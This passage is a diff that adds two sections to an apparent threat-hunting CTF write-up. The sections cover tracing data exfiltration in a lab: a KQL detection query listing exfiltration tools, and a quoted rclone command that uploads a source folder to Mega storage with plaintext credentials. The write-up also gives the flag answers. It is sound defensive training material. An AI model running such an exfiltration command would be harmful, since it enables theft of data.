@@ -181,3 +181,52 @@ The `-Path` argument is the source — `C:\GameDev`. The `-DestinationPath` stag
  
 </details>
 
+<details>
+<summary>Q02 — Exfil Destination</summary>
+ 
+**Goal:** Identify the cloud service that received the stolen data.
+ 
+**Approach:** The exfiltration tool and its configuration reveal the destination. From Q01, we know the data was compressed to gamedev.zip. Now find what tool uploaded it and where. Searched for cloud storage tools and rclone specifically, since it's a common choice for bulk exfiltration.
+ 
+```kql
+EmberForgeX_CL
+| where TimeGenerated >= datetime(2026-02-10)
+| where TimeGenerated <= datetime(2026-02-11)
+| where CommandLine_s has_any ("rclone", "aws", "gsutil", "az storage", "mega", "dropbox", "curl", "gamedev.zip")
+```
+ 
+Multiple rclone commands fired on the server at 10:38:53 AM. The configuration revealed the cloud destination and account:
+ 
+<img width="1701" height="60" alt="image" src="https://github.com/user-attachments/assets/36eb2e74-9495-46da-a275-ec5423308cf8" />
+<br>
+ 
+The `mega:exfil` remote points to **Mega** cloud storage (mega.nz). The account credentials were embedded in the command line.
+ 
+**Flag:** `Mega`
+ 
+> **Lesson:** Cloud exfiltration tools leak their configuration in command lines — the service name, remote path, and credentials are all visible in the logs. Rclone specifically uses colon-separated remote notation (service:path). When hunting exfil, search for common tools and parse their arguments to extract both destination and account information.
+ 
+</details>
+
+<details>
+<summary>Q03 — Attacker Attribution</summary>
+
+**Goal:** Identify the email account used to authenticate to the cloud storage service.
+
+**Approach:** The exfiltration command from Q02 contained login credentials visible in plaintext. The attacker configured rclone with an email and password for Mega authentication. Extract the email directly from the command line arguments.
+
+From the Q02 rclone command:
+
+```
+rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
+```
+
+The `--mega-user` parameter contains the authentication email: **jwilson.vhr@proton.me**
+
+This email serves as the attacker's persistent identifier across the exfiltration infrastructure. The domain proton.me indicates use of ProtonMail for anonymity, and the username "jwilson" is a reference to the attacker's real or operational identity.
+
+**Flag:** `jwilson.vhr@proton.me`
+
+> **Lesson:** Credentials in command lines are the easiest IOCs to extract. Exfiltration tools require authentication, and that authentication is logged verbatim in process execution events. Always parse tool arguments for `--user`, `--password`, `-u`, `-p`, and similar flags. The email or username becomes an attribution anchor for linking attacker infrastructure across multiple incidents.
+
+</details>
